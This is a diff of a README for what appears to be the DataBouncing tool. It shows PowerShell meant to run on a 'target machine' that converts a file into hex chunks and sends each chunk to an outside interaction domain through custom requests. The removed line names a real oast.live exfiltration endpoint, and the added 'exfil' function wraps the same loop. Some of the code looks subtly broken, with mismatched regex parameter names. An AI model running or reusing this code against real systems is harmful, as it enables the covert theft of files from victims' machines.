@@ -14,15 +14,27 @@ Next on the target machine you are going to want to convert a file to Hex and pr
 [chunks](https://github.com/Unit-259/DataBouncing/blob/main/Client/Convert-FileToHexChunks.ps1)
 
 ```powershell
-$segments = Convert-FileToHexChunks -FilePath .\file.txt
+
+function exfil {
+    param (
+        [string]xregex,
+        [string]$domain,
+        [string]$url
+    )
+    $segments = Convert-FileToHexChunks -FilePath .\file.txt
+    foreach ($segment in $segments.PSObject.Properties) {
+        $secret = $segment.Value;
+        send-customRequest -Url "$regex.$url" -Domain "$domain"    
+    }
+}
 ```
 
-foreach ($segment in $segments.PSObject.Properties) {$secret = $segment.Value;send-customRequest -Url "adobe.com" -Domain "clnd1r2ilvdup3udiuk0fgw7q6dgzfwx4.oast.live"}
+
 
 
 
 ```
-function Send-Secrets {
+function Demo-Secrets {
     param (
         [string]$xregex,
         [string]$urlSuffix
